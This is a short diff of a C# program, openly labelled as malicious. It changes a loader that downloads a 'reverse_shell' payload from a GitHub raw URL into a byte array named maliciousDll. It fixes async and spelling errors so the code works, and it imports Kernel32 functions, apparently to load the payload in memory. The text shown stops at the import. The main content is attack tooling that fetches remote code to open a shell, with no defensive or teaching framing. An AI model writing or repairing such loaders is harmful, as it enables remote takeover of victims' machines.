@@ -1,19 +1,21 @@
 using System;
 using System.Net.Http;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
 
 public class Program {
 
 
-    public static byte[] maliciousDll = GetMaliciousDll("https://github.com/bakarilevy/killchain/reverse_shell.dll");
+    public static byte[] maliciousDll = GetMaliciousDll("https://raw.githubusercontent.com/bakarilevy/TheKillchain/main/reverse_shell.txt");
 
     public static byte[] GetMaliciousDll(string url) {
-        using (var client = new HttpClient())
-        using (HttpResponseMessage response = await client.GetAsync(url))
+        HttpClient client = new HttpClient();
+        HttpResponseMessage response = client.GetAsync(url).Result;
+        response.EnsureSuccessStatusCode();
         {
-            byte[] maliciousDll = await response.Content.ReadAsByteArrayAsync();
+            byte[] maliciousDll = response.Content.ReadAsByteArrayAsync().Result;
         }
-        return maliousDll;
+        return maliciousDll;
     }
 
     [DllImport("Kernel32.dll", SetLastError = true)]
